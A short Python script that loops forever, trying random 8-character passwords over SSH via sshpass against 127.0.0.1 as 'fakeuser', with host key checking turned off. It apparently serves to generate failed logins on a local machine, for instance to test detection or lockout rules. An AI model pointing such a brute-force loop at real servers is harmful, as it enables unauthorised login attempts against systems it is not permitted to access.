import subprocess
import random
import time
import string

target = "127.0.0.1"
user = "fakeuser"

def random_password(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

while True:
    password = random_password()

    print(f"[*] Trying password: {password}")

    subprocess.run([
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=3",
        f"{user}@{target}"
    ])

    time.sleep(1)
